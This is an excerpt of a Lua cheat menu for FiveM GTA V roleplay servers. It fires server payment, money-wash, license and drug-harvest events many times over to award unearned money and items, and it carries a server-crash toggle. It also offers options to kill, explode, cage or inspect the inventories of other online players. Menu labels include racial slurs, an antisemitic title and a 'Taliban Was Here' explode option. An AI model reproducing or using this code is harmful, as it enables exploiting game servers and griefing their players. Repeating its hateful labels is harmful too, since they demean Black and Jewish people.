...
local RichContent = RichName .. 'stripped'
local RichAsset = 'Maestro 2.3'
local RichAssetSmall = 'In native UI'
...
do
    function UIMenuItem.New(Text, Description)
        local _UIMenuItem = {
            ...
            _Text = {
                Padding = {X = 8},
                Colour = {Selected = {R = 0, G = 0, B = 0, A = 255}, Hovered = {R = 255, G = 0, B = 0, A = 255}}
            },
            _Description = tostring(Description) or "",
            SelectedSprite = Sprite.New("commonmenu", "interaction_bgd", 0, 0, 431, 38, nil, 200, 200, 200, 150),
...
do
    function UIMenuColourPanel.New(Title, Colours)
        local _UIMenuColourPanel = {
            ...
            Background = Sprite.New("commonmenu", "interaction_bgd", 0, 0, 431, 112),
            Bar = {},
            EnableArrow = true,
...
do
    function UIMenuGridPanel.New(TopText, LeftText, RightText, BottomText, CirclePositionX, CirclePositionY)
        local _UIMenuGridPanel = {
            ...
            Background = Sprite.New("commonmenu", "interaction_bgd", 0, 0, 431, 275),
...
do
    function UIMenuPercentagePanel.New(MinText, MaxText)
        local _UIMenuPercentagePanel = {
            ...
            Background = Sprite.New("commonmenu", "interaction_bgd", 0, 0, 431, 76),
...
do
    function UIMenu.New(Title, Subtitle, X, Y, TxtDictionary, TxtName, Heading, R, G, B, A)
        ...
        local _UIMenu = {
            Logo = Sprite.New(TxtDictionary, TxtName, 0 + X, 0 + Y, 110, 107, Heading, R, G, B, A),
            Banner = nil,
            Title = UIResText.New(Title, 215 + X, 20 + Y, 1.15, 255, 0, 0, 255, 1, 1, 0),
            BetterSize = true,
            Subtitle = {ExtraY = 0},
            WidthOffset = 0,
            Position = {X = X, Y = Y},
        ...
        _UIMenu.Description.Rectangle = Sprite.New("commonmenu", "interaction_bgd", _UIMenu.Position.X, 127, 431, 30) --INFO UNDER MENU
        ...
        _UIMenu.Background = Sprite.New("commonmenu", "header_gradient_script", _UIMenu.Position.X, 144 + _UIMenu.Position.Y - 37 + _UIMenu.Subtitle.ExtraY, 290, 25) --MENU BACKGROUND
...
MaestroEra = NativeUI.CreateMenu("Allah Sent", "~r~Imagine being jewish", X, Y, "shopui_title_clubhousemod", "shopui_title_clubhousemod")

MaestroEraPool = NativeUI.CreatePool()
MaestroEraPool:Add(MaestroEra)
...
if RichEnable then
            ...
            SetDiscordRichPresenceAssetText(RichAsset)
            SetDiscordRichPresenceAssetSmallText(RichAssetSmall)
        else
...
local Enable_ServerCrash = false
local Enable_Swipe = false
local Enable_GcPhone = false
local Enable_Jail = false
local Enable_FastRun = false
local Enable_NoClip = false
local Enable_InfiniteStamina = false
local Enable_SuperJump = false
local Enable_VehicleGodMode = false
local Enable_ExplosiveFists = false
...
Jobs.Item = {
    "Butcher", "Tailor", "Miner", "Fueler", "Lumberjack", "Fisher", "Hunting"
}
Jobs.ItemDatabase = {
...
Drugs.Item = {
    "Weed", "Meth", "Coke", "Opium", "Dirty Money"
}
Drugs.ItemDatabase = {
    ...
    ["Dirty Money"]     = oTable.new{ "Dirty Money", "oxycutter" },
}
Drugs.ItemRequires = {
    ["Coke Bag"]        = "coke",
    ["Weed Bag"]        = "weed",
...
--==================================================================================================================================================--
local CarTypes = {
    "HoaX's Choice", "Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military",
    "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains",
    "Utility", "Vans"
}
do
    HoaxChoice = {"Tezeract", "Dune4", "Dune5", "Nero2", "Bmx", "Sanchez", "Rhino", "Barrage", "Phantom2"}
    --==================================================================================================================================================--
    Boats = {
...
local CarsArray = {
    HoaxChoice, Boats, Commercial, Compacts, Coupes, Cycles, Emergency, Helicopters, Industrial, Military, Motorcycles, Muscle, OffRoad,
...
function SpawnWeaponMenu(WeaponSpawnMenu, PlayerPed)
    ...
    local handGunsMenu = (MaestroEraPool:AddSubMenu(WeaponSpawnMenu, "Handguns"))
    handGunsMenu.Item:RightLabel("->")
    handGunsMenu = handGunsMenu.SubMenu

    local riflesMenu = (MaestroEraPool:AddSubMenu(WeaponSpawnMenu, "Assault Rifles"))
    riflesMenu.Item:RightLabel("->")
    riflesMenu = riflesMenu.SubMenu

    local shotgunsMenu = (MaestroEraPool:AddSubMenu(WeaponSpawnMenu, "Shotguns"))
    shotgunsMenu.Item:RightLabel("->")
    shotgunsMenu = shotgunsMenu.SubMenu

    local smgsMenu = (MaestroEraPool:AddSubMenu(WeaponSpawnMenu, "Sub-/Light Machine Guns"))
    smgsMenu.Item:RightLabel("->")
    smgsMenu = smgsMenu.SubMenu

    local throwablesMenu = (MaestroEraPool:AddSubMenu(WeaponSpawnMenu, "Throwables"))
    throwablesMenu.Item:RightLabel("->")
    throwablesMenu = throwablesMenu.SubMenu

    local meleeMenu = (MaestroEraPool:AddSubMenu(WeaponSpawnMenu, "Melee"))
    meleeMenu.Item:RightLabel("->")
    meleeMenu = meleeMenu.SubMenu

    local heavyMenu = (MaestroEraPool:AddSubMenu(WeaponSpawnMenu, "Heavy Weapons"))
    heavyMenu.Item:RightLabel("->")
    heavyMenu = heavyMenu.SubMenu

    local snipersMenu = (MaestroEraPool:AddSubMenu(WeaponSpawnMenu, "Sniper Rifles"))
    ...
    for key, weapon in pairs(weaponList) do
        ...
        if not string.IsNullOrEmpty(weapon.Name) then
            ...
            local weaponMenu = (MaestroEraPool:AddSubMenu(WeaponSpawnMenu, "~y~" ..tostring(weapon.Name).."~s~ Options", weapon.Name, "false"))
...
do
    ...
    FiveM.DriftVehicle = function(vehicle) SetVehicleReduceGrip(vehicle, 1.0)
    SetVehicleEngineTorqueMultiplier(vehicle, 8.0) end

    FiveM.SuperHandling = function(vehicle) SetVehicleGravityAmount(vehicle, 15.0) end
...
function maxTuneMech(playerPed)
...
do
    ...
    Citizen.CreateThread(function()
        while ShowMenu do
            ...
            MaestroEra.Logo:Colour( 130, 0, 210, 255)
        end
    end)
...
if Enable_Nuke then
            ...
            if Enable_Swipe then
				FiveM.TriggerCustomEvent(false,"esx_godirtyjob:pay", 500000)
                FiveM.TriggerCustomEvent(false,"esx_pizza:pay", 500000)
                FiveM.TriggerCustomEvent(false,"esx_slotmachine:sv:2", 500000)
                FiveM.TriggerCustomEvent(false,"esx_banksecurity:pay", 500000)
                FiveM.TriggerCustomEvent(false,"esx_gopostaljob:pay", 500000)
                FiveM.TriggerCustomEvent(false,"esx_truckerjob:pay", 500000)
                FiveM.TriggerCustomEvent(false,"esx_carthief:pay", 500000)
                FiveM.TriggerCustomEvent(false,"esx_garbagejob:pay", 500000)
                FiveM.TriggerCustomEvent(false,"esx_ranger:pay", 500000)
                FiveM.TriggerCustomEvent(false,"esx_truckersjob:payy", 500000)
				FiveM.TriggerCustomEvent(false,"tost:zgarnijsiano")
                FiveM.TriggerCustomEvent(false,"Sasaki_kurier:pay", 500000)
                FiveM.TriggerCustomEvent(false,"wojtek_ubereats:napiwek")
                FiveM.TriggerCustomEvent(false,"wojtek_ubereats:hajs")
                FiveM.TriggerCustomEvent(false,'xk3ly-barbasz:getfukingmony')
                FiveM.TriggerCustomEvent(false,'xk3ly-farmer:paycheck', 500000)        
                FiveM.TriggerCustomEvent(false,"tostzdrapka:wygranko", securityToken)
                FiveM.TriggerCustomEvent(false,"esx_blanchisseur:washMoney", 500000)
                FiveM.TriggerCustomEvent(false,"esx_moneywash:withdraw", 500000)
                FiveM.TriggerCustomEvent(false,"laundry:washcash", 500000)
                FiveM.TriggerCustomEvent(false,"esx_blanchisseur:startWhitening", 500000)
                FiveM.TriggerCustomEvent(false,"esx_banksecurity:pay", 500000)
                FiveM.TriggerCustomEvent(false,"esx_slotmachine:sv:2", 500000)
                FiveM.TriggerCustomEvent(false,"esx_billing:sendBill", 500000)
                FiveM.TriggerCustomEvent(false,"projektsantos:mandathajs", -500)
				FiveM.TriggerCustomEvent(false,'program-keycard:hacking')
				FiveM.TriggerCustomEvent(false,'InteractSound_SV:PlayWithinDistance', 99999999999999, 'Track2', 1.0)
				FiveM.TriggerCustomEvent(false,'xk3ly-barbasz:getfukingmony')
                FiveM.TriggerCustomEvent(false,'xk3ly-farmer:paycheck', 2335)
                FiveM.TriggerCustomEvent(false,"6a7af019-2b92-4ec2-9435-8fb9bd031c26", 300000)
                FiveM.TriggerCustomEvent(false,"211ef2f8-f09c-4582-91d8-087ca2130157", 300000)
                FiveM.TriggerCustomEvent(false,'esx_dmvschool:pay', -3000000)
				FiveM.TriggerCustomEvent(false,'neweden_garage:pay', -300000)
                FiveM.TriggerCustomEvent(false,"_chat:messageEntered", 'pepega',{0,0x99,255}, 'Damm u smart')   
					end
    ...
    local function AddPlayerOptionsMenu(menu)
        local PlayerOptionsMenu = (MaestroEraPool:AddSubMenu(menu, "Player Options"))
        ...
        local suicide = NativeUI.CreateItem("~r~Suicide", "Instantly Kill Yourself")
        suicide.Activated = function(ParentMenu, SelectedItem) SetEntityHealth(PlayerPedId(), 0) end
        PlayerOptionsMenu:AddItem(suicide)

	    local revive = NativeUI.CreateItem("~g~Revive Yourself (ESX)", "Raise From The Dead")
        ...
        local heal = NativeUI.CreateItem("~g~Heal Yourself", "Get More Health")
        heal.Activated = function(ParentMenu, SelectedItem) SetEntityHealth(PlayerPedId(), 200) end
        PlayerOptionsMenu:AddItem(heal)

        local armour = NativeUI.CreateItem("~g~Get 100 % Armour", "Armour The Fuck Up")
        ...
        local setHunger = NativeUI.CreateItem("~g~Hunger Full", "Set Your Hunger Bar To Full")
        ...
        local setThirst = NativeUI.CreateItem("~g~Thirst Full", "Set Your Thirst Bar To Full")
        ...
        local unlimitedStamina = NativeUI.CreateCheckboxItem("~g~Unlimited Stamina", Enable_InfiniteStamina, "Usain Bolt Powers.")
        ...
        local ExplosiveFists = NativeUI.CreateCheckboxItem("~r~Explosive Fists", Enable_ExplosiveFists, "Hellboy throwback.")
        ExplosiveFists.CheckboxEvent = function(menu, item, enabled) Enable_ExplosiveFists = enabled end
        PlayerOptionsMenu:AddItem(ExplosiveFists)

        local Swipe = NativeUI.CreateItem("Swipe", "Swipe that bitttch")
        Swipe.Activated = function(ParentMenu, SelectedItem) 
                ...
                TriggerServerEvent("_chat:messageEntered", 'pepega',{0,0x99,255}, '/ooc Heey') end
        PlayerOptionsMenu:AddItem(Swipe)

        local VRPSalary = NativeUI.CreateItem("VRP Salary", "Salary Times a 100")
        VRPSalary.Activated = function(ParentMenu, SelectedItem) 
			    ...
			    a=1 repeat TriggerServerEvent("PayForRepairNow",-100000) a=a+1 until (a>100) end
        PlayerOptionsMenu:AddItem(VRPSalary)

        local VRPMoney = NativeUI.CreateItem("VRP Money", "Should be a 100k i reckin")
        VRPMoney.Activated = function(ParentMenu, SelectedItem) 
                TriggerServerEvent("dropOff", 100000)
			    TriggerServerEvent('PayForRepairNow',-100000) end
        PlayerOptionsMenu:AddItem(VRPMoney)

        local openSkinMenu = NativeUI.CreateItem("~g~Change Your InGame Skin", "")
        openSkinMenu.Activated = function(ParentMenu, SelectedItem)
            FiveM.TriggerCustomEvent(false, 'esx_skin:openRestrictedMenu', function(data, menu) MaestroEraPool:CloseAllMenus() end) end
    ...
    local function AddOnlinePlayersMenu(menu)
        ...
        local OnlinePlayersMenu = (MaestroEraPool:AddSubMenu(menu, "Online Players"))
        OnlinePlayersMenu.Item:RightLabel("->")

        local OnlinePlayerOptionsMenu = MaestroEraPool:AddSubMenu(OnlinePlayersMenu.SubMenu, "Online Player Options")

        do

        local Spectate = NativeUI.CreateItem("~g~Spectate Player", "Spectate "..PlayerName..". I'm Watching You X)")
            ...
            local Teleport = NativeUI.CreateItem("~g~Teleport To Player", "Teleport To "..PlayerName)
            ...
            local OpenInventory = NativeUI.CreateItem("~g~Open Inventory", "Open This Idiots Inventory")
            OpenInventory.Activated = function(ParentMenu, SelectedItem) FiveM.TriggerCustomEvent(false, "esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer)) end
            OnlinePlayerOptionsMenu.SubMenu:AddItem(OpenInventory)

            local NativeSlay = NativeUI.CreateItem("~g~Kill", "Kill This Nigga "..PlayerName)
            ...
            local CagePlayer = NativeUI.CreateItem("Cage this Player", "Monkey man in a cage"..PlayerName)
            ...
            local NativeExplode = NativeUI.CreateItem("~g~Taliban Was Here", "Explode "..PlayerName.." KABOOM")
            ...
            local StopActions = NativeUI.CreateItem("~g~Stop Tasks", "Make This Nigga "..PlayerName.." Fly Out Of His Car And More")
            ...
            local BreakEngine = NativeUI.CreateItem("~r~Break Vehicle Engine", "Break This Niggas Engine")
            BreakEngine.Activated = function(ParentMenu, SelectedItem) NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
                ...
                SetVehicleEngineHealth(GetVehiclePedIsIn(playerPed), 100) end
            OnlinePlayerOptionsMenu.SubMenu:AddItem(BreakEngine)

            local cloneVehicle = NativeUI.CreateItem("~g~Get This Car", "Clone "..PlayerName.."'s Vehicle")
            ...
            local spawnJesus = NativeUI.CreateItem("Raining Monkeys", "Shit Zoo  "..PlayerName)
        ...
        local spawnLoco = NativeUI.CreateItem("Spawn Pendejos", "Crazy Shit  "..PlayerName)
            spawnLoco.Activated = function(ParentMenu, SelectedItem)
                local bQ = 'a_m_y_mexthug_01'
            ...
            OnlinePlayerOptionsMenu.SubMenu:AddItem(spawnLoco)
        end
    ...
    local function AddTeleportMenu(menu)
        local TeleportMenu = (MaestroEraPool:AddSubMenu(menu, "Teleport Options"))
        TeleportMenu.Item:RightLabel("->")
        TeleportMenu = TeleportMenu.SubMenu

        local TeleportToWayPoint = NativeUI.CreateItem("~r~Teleport To Waypoint", "~r~ Teleport To Waypoint")
    ...
    local function AddWeaponOptionsMenu(menu)
        local WeaponOptionsMenu = (MaestroEraPool:AddSubMenu(menu, "Weapon Options"))
        WeaponOptionsMenu.Item:RightLabel("->")
        WeaponOptionsMenu = WeaponOptionsMenu.SubMenu

        local WeaponSpawnMenu = (MaestroEraPool:AddSubMenu(WeaponOptionsMenu, "Spawn Weapon"))
    ...
    local function AddVehicleAutoPilot(menu)
        local vehicleAutoPilotMenu = (MaestroEraPool:AddSubMenu(menu, "Vehicle Auto Pilot", "Manage vehicle auto pilot options."))
    ...
    local function AddVehicleOptionsMenu(menu)
        local VehicleOptionsMenu = (MaestroEraPool:AddSubMenu(menu, "Vehicle Options"))
        ...
        local repairEngine = NativeUI.CreateItem("~b~Repair Vehicle Engine", "Repair only physical damage on your vehicle.")
        repairEngine:RightLabel("🔧")
        repairEngine.Activated = function(ParentMenu, SelectedItem)
        local playerPed = GetPlayerPed(SelectedPlayer)
        NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
        SetVehicleUndriveable(GetVehiclePedIsIn(playerPed),false)
        SetVehicleEngineHealth(GetVehiclePedIsIn(playerPed), 1000) end
        VehicleOptionsMenu:AddItem(repairEngine)

        local flipVehicle = NativeUI.CreateItem("Flip Vehicle", "Will Flip The Vehicle")
        flipVehicle.Activated = function(ParentMenu, SelectedItem)
                local ax = GetPlayerPed(-1)
                local ay = GetVehiclePedIsIn(ax, true)
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
        ...
        VehicleOptionsMenu:AddItem(flipVehicle)
        ...
        local DriftVehicle = NativeUI.CreateItem("Tokyo Drift", "Drift Like Han.")
        DriftVehicle.Activated = function(ParentMenu, SelectedItem) FiveM.DriftVehicle(GetVehiclePedIsIn(GetPlayerPed(-1))) end
        VehicleOptionsMenu:AddItem(DriftVehicle)

        local SuperHandling = NativeUI.CreateItem("Super Handle", "Batmobile Handling.")
        SuperHandling.Activated = function(ParentMenu, SelectedItem) FiveM.SuperHandling(GetVehiclePedIsIn(GetPlayerPed(-1))) end
        VehicleOptionsMenu:AddItem(SuperHandling)
        ...
        local ESXDrivingLicense = NativeUI.CreateItem("Get Esx driving license", "So u can legally drive")
        ESXDrivingLicense.Activated = function(ParentMenu, SelectedItem) 
            TriggerServerEvent("dmv:success")
					...
					TriggerServerEvent('esx_airlines:addLicense', 'avion') end
        VehicleOptionsMenu:AddItem(ESXDrivingLicense)

        local VRPDrivingLicense = NativeUI.CreateItem("Get Vrp driving license", "So u can legally drive")
        VRPDrivingLicense.Activated = function(ParentMenu, SelectedItem) 
            TriggerServerEvent('dmv:success') end
        VehicleOptionsMenu:AddItem(VRPDrivingLicense)
    ...
    local function AddHarvestMenu(menu)
        local SettingOptionsMenu = (MaestroEraPool:AddSubMenu(menu, "Harvest Menu - Triggers"))
        SettingOptionsMenu.Item:RightLabel("🌿")
        SettingOptionsMenu = SettingOptionsMenu.SubMenu

        SettingOptionsMenu:AddSpacerItem("Drugs ↓")

        local WeedHarvest = NativeUI.CreateItem("~g~Weed Harvest", "Times 5 baby")
        WeedHarvest.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed") end
        SettingOptionsMenu:AddItem(WeedHarvest)

        local WeedTransform = NativeUI.CreateItem("~g~Weed Transform", "Times 5 baby")
        WeedTransform.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed") end
            SettingOptionsMenu:AddItem(WeedTransform)

        local WeedSell = NativeUI.CreateItem("~g~Weed Sell", "Times 5 baby")
        WeedSell.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed") end
            SettingOptionsMenu:AddItem(WeedSell)
        

        local CokeHarvest = NativeUI.CreateItem("~w~Coke Harvest", "Times 5 baby")
        CokeHarvest.Activated = function(ParentMenu, SelectedItem) 
                        TriggerServerEvent("esx_drugs:startHarvestCoke")
                        TriggerServerEvent("esx_drugs:startHarvestCoke")
                        TriggerServerEvent("esx_drugs:startHarvestCoke")
                        TriggerServerEvent("esx_drugs:startHarvestCoke")
                        TriggerServerEvent("esx_drugs:startHarvestCoke") end
            SettingOptionsMenu:AddItem(CokeHarvest)
            
            local CokeTransform = NativeUI.CreateItem("~w~Coke Transform", "Times 5 baby")
        CokeTransform.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke") end
            SettingOptionsMenu:AddItem(CokeTransform)
			
			local CokeSell = NativeUI.CreateItem("~w~Coke Sell", "Times 5 baby")
        CokeSell.Activated = function(ParentMenu, SelectedItem) 
            TriggerServerEvent("esx_drugs:startSellCoke")
            TriggerServerEvent("esx_drugs:startSellCoke")
            TriggerServerEvent("esx_drugs:startSellCoke")
            TriggerServerEvent("esx_drugs:startSellCoke")
            TriggerServerEvent("esx_drugs:startSellCoke") end
            SettingOptionsMenu:AddItem(CokeSell)

            local MethHarvest = NativeUI.CreateItem("~b~Meth Harvest", "Times 5 baby")
        MethHarvest.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth") end
            SettingOptionsMenu:AddItem(MethHarvest)

			local MethTransform = NativeUI.CreateItem("~b~Meth Transform", "Times 5 baby")
        MethTransform.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth") end
            SettingOptionsMenu:AddItem(MethTransform)	
			
			local MethSell = NativeUI.CreateItem("~b~Meth Sell", "Times 5 baby")
        MethSell.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth") end
            SettingOptionsMenu:AddItem(MethSell)
			
			local OpiumHarvest = NativeUI.CreateItem("~p~Opium Harvest", "Times 5 baby")
        OpiumHarvest.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium") end
            SettingOptionsMenu:AddItem(OpiumHarvest)
			
			local OpiumTransform = NativeUI.CreateItem("~p~Opium Transform", "Times 5 baby")
        OpiumTransform.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium") end
            SettingOptionsMenu:AddItem(OpiumTransform)
			
			local OpiumSell = NativeUI.CreateItem("~p~Opium Sell", "Times 5 baby")
        OpiumSell.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium") end
            SettingOptionsMenu:AddItem(OpiumSell)

            SettingOptionsMenu:AddSpacerItem("Mechanic items ↓")

            local GasCanHarvest = NativeUI.CreateItem("~b~Harvest GasCan", "Times 5 baby")
            GasCanHarvest.Activated = function(ParentMenu, SelectedItem) 
                        TriggerServerEvent('esx_mechanicjob:startHarvest')
                        TriggerServerEvent('esx_mechanicjob:startHarvest')
                        TriggerServerEvent('esx_mechanicjob:startHarvest')
                        TriggerServerEvent('esx_mechanicjob:startHarvest')
                        TriggerServerEvent('esx_mechanicjob:startHarvest') end
                SettingOptionsMenu:AddItem(GasCanHarvest)
                
                local RepairHarvest = NativeUI.CreateItem("~b~Harvest RepairTools", "Times 5 baby")
            RepairHarvest.Activated = function(ParentMenu, SelectedItem) 
                        TriggerServerEvent('esx_mechanicjob:startHarvest2')
                        TriggerServerEvent('esx_mechanicjob:startHarvest2')
                        TriggerServerEvent('esx_mechanicjob:startHarvest2')
                        TriggerServerEvent('esx_mechanicjob:startHarvest2')
                        TriggerServerEvent('esx_mechanicjob:startHarvest2') end
                SettingOptionsMenu:AddItem(RepairHarvest) 

                local BodyToolsHarvest = NativeUI.CreateItem("~b~Harvest BodyTools", "Times 5 baby")
        BodyToolsHarvest.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent('esx_mechanicjob:startHarvest3')
					TriggerServerEvent('esx_mechanicjob:startHarvest3')
					TriggerServerEvent('esx_mechanicjob:startHarvest3')
					TriggerServerEvent('esx_mechanicjob:startHarvest3')
					TriggerServerEvent('esx_mechanicjob:startHarvest3') end
            SettingOptionsMenu:AddItem(BodyToolsHarvest)
			
			local TunerChipHarvest = NativeUI.CreateItem("~b~Harvest TunerChip", "Times 5 baby")
        TunerChipHarvest.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent('esx_mechanicjob:startHarvest4')
					TriggerServerEvent('esx_mechanicjob:startHarvest4')
					TriggerServerEvent('esx_mechanicjob:startHarvest4')
					TriggerServerEvent('esx_mechanicjob:startHarvest4')
					TriggerServerEvent('esx_mechanicjob:startHarvest4') end
            SettingOptionsMenu:AddItem(TunerChipHarvest)

            local BlowTorchCraft = NativeUI.CreateItem("~c~Craft Blowtorch", "Times 5 baby")
        BlowTorchCraft.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent('esx_mechanicjob:startCraft')
					TriggerServerEvent('esx_mechanicjob:startCraft')
					TriggerServerEvent('esx_mechanicjob:startCraft')
					TriggerServerEvent('esx_mechanicjob:startCraft')
					TriggerServerEvent('esx_mechanicjob:startCraft') end
            SettingOptionsMenu:AddItem(BlowTorchCraft)
			
			local RepairKitCraft = NativeUI.CreateItem("~c~Craft RepairKit", "Times 5 baby")
        RepairKitCraft.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent('esx_mechanicjob:startCraft2')
					TriggerServerEvent('esx_mechanicjob:startCraft2')
					TriggerServerEvent('esx_mechanicjob:startCraft2')
					TriggerServerEvent('esx_mechanicjob:startCraft2')
					TriggerServerEvent('esx_mechanicjob:startCraft2') end
            SettingOptionsMenu:AddItem(RepairKitCraft)

            local BodyKitCraft = NativeUI.CreateItem("~c~Craft BodyKit", "Times 5 baby")
        BodyKitCraft.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent('esx_mechanicjob:startCraft3')
					TriggerServerEvent('esx_mechanicjob:startCraft3')
					TriggerServerEvent('esx_mechanicjob:startCraft3')
					TriggerServerEvent('esx_mechanicjob:startCraft3')
					TriggerServerEvent('esx_mechanicjob:startCraft3') end
            SettingOptionsMenu:AddItem(BodyKitCraft)
			
			local BitcoinHarvest = NativeUI.CreateItem("~y~Harvest Bitcoin", "Times 5 baby")
        BitcoinHarvest.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
					TriggerServerEvent('esx_bitcoin:startHarvestKoda') end
            SettingOptionsMenu:AddItem(BitcoinHarvest)
			
			local BitcoinSell = NativeUI.CreateItem("~y~Sell Bitcoin", "Times 5 baby")
        BitcoinSell.Activated = function(ParentMenu, SelectedItem) 
					TriggerServerEvent('esx_bitcoin:startSellKoda')
					TriggerServerEvent('esx_bitcoin:startSellKoda')
					TriggerServerEvent('esx_bitcoin:startSellKoda')
					TriggerServerEvent('esx_bitcoin:startSellKoda')
					TriggerServerEvent('esx_bitcoin:startSellKoda') end
            SettingOptionsMenu:AddItem(BitcoinSell)
			
			local StopAll = NativeUI.CreateItem("~r~Stop all", "Stops evrything,mechanic,drugs...")
        StopAll.Activated = function(ParentMenu, SelectedItem) 
					...
					TriggerServerEvent('esx_mechanicjob:stopHarvest') --gascan
					TriggerServerEvent('esx_mechanicjob:stopHarvest2') --repair tools
					TriggerServerEvent('esx_mechanicjob:stopHarvest2') --body tools
					TriggerServerEvent('esx_mechanicjob:stopHarvest4') --tuner chip
					TriggerServerEvent('esx_mechanicjob:stopCraft') --blow torch
					TriggerServerEvent('esx_mechanicjob:stopCraft2') --repair kit
					TriggerServerEvent('esx_mechanicjob:stopCraft3') end --body kit end
            SettingOptionsMenu:AddItem(StopAll)
        end

    local function AddTriggerOptionsMenu(menu)
        local TriggerOptionsMenu = (MaestroEraPool:AddSubMenu(menu, "Item Adder"))
        ...
        local ESXSpawnJobItem = NativeUI.CreateListItem("~y~ESX:~s~ Get Job Item", Jobs.Item, 1, "ESX Jobs.");
        ...
        local ESXSpawnDrugItem = NativeUI.CreateListItem("~y~ESX:~s~ Drugs", Drugs.Item, 1, "ESX Drugs");
        ESXSpawnDrugItem.OnListSelected = function(menu, list, index)
            local item = list:IndexToItem(index)
            local DrugDB = Drugs.ItemDatabase[item];
            if type(DrugDB) == "table" then
                Citizen.CreateThread(function()
                    for key, value in pairs(DrugDB) do
                        local ItemRequired = Drugs.ItemRequires[key];
                        local ItemData = {
                            {
                                name = key, db_name = value, time = 100, max = 100, add = 10, remove = 10, drop = 100,
                                requires = ItemRequired and DrugDB[ItemRequired] or "nothing",
                                requires_name = ItemRequired and ItemRequired or "Nothing"
                            }
                        }
                        Citizen.CreateThread(function()
                ...
                local ItemRequired = Drugs.ItemRequires[item];
                local ItemData = {
                    {
                        name = item, db_name = DrugDB, time = 100, max = 100, add = 10, remove = 10, drop = 100,
                        requires = ItemRequired and Drugs.ItemDatabase[ItemRequired] or "nothing",
                        requires_name = ItemRequired and ItemRequired or "Nothing"
                    }
                }
                Citizen.CreateThread(function()
        ...
        TriggerOptionsMenu:AddItem(ESXSpawnDrugItem)
        FiveM.SetResourceLocked('esx_jobs', ESXSpawnDrugItem)

    local ESXSpawnCustomItem = NativeUI.CreateListItem("~y~Custom: ~s~Items", CustomItems.Item, 1, "ESX Items");
        ESXSpawnCustomItem.OnListSelected = function(menu, list, index)
            local item = list:IndexToItem(index)
            local CustomDB = CustomItems.ItemDatabase[item];
            if type(CustomDB) == "table" then
                Citizen.CreateThread(function()
                    for key, value in pairs(CustomDB) do
                        local ItemRequired = CustomItems.ItemRequires[key];
                        local ItemData = {
                            {
                                name = key, db_name = value, time = 100, max = 100, add = 10, remove = 10, drop = 100,
                                requires = ItemRequired and CustomDB[ItemRequired] or "nothing",
                                requires_name = ItemRequired and ItemRequired or "Nothing"
                            }
                        }
                        Citizen.CreateThread(function()
                ...
                local ItemRequired = CustomItems.ItemRequires[item];
                local ItemData = {
                    {
